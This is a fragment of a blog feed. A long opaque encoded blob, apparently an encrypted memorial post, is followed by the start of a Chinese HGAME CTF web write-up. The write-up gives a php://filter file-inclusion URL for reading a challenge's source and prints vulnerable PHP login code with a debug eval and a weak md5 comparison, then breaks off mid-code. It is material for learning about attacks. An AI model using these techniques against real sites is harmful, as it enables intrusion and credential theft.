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 </div>]]></content>
      
      
      
        <tags>
            
            <tag> 科比-布莱恩特 </tag>
            
            <tag> 缅怀 </tag>
            
            <tag> R.I.P </tag>
            
            <tag> 曼巴精神永存! </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HGAME CTF Web Writeup(Week 2)</title>
      <link href="/posts/20200126/"/>
      <url>/posts/20200126/</url>
      
        <content type="html"><![CDATA[<p>果然,我还是不够努力吧.第二周的有些题开始<strong>综合</strong>起来了.<strong>还是多刷题吧,因为不知道是什么,就不知道怎么做</strong></p><p>下面主要记录我做题过程吧!</p><h1 id="Cosmos的博客后台"><a href="#Cosmos的博客后台" class="headerlink" title="Cosmos的博客后台"></a>Cosmos的博客后台</h1><p><strong>个人感觉这道题比较接近实战</strong></p><p>题目描述</p><blockquote><p>Cosmos通过两个小时速成了PHP+HTML，没学过sql的他信心满满的写了一个博客，他说要从博客后台开始……(flag在根目录, 禁止使用任何扫描器)</p></blockquote><ul><li>文件包含读取源码</li><li>利用变量覆盖和弱类型读取账户信息</li><li>插入图片处存在SSRF,绕过parse_url()</li></ul><p><code>http://cosmos-admin.hgame.day-day.work/?action=php://filter/read=convert.base64-encode/resource=login.php</code></p><p>读取login.php 的源码,这里只需要PHP代码就行了</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">"config.php"</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//Only for debug</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">DEBUG_MODE</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'debug'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$debug</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'debug'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/"</span><span class="token punctuation">,</span> <span class="token variable">$debug</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"args error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"var_dump($$debug);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: admin.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$admin_password</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token variable">$admin_username</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token 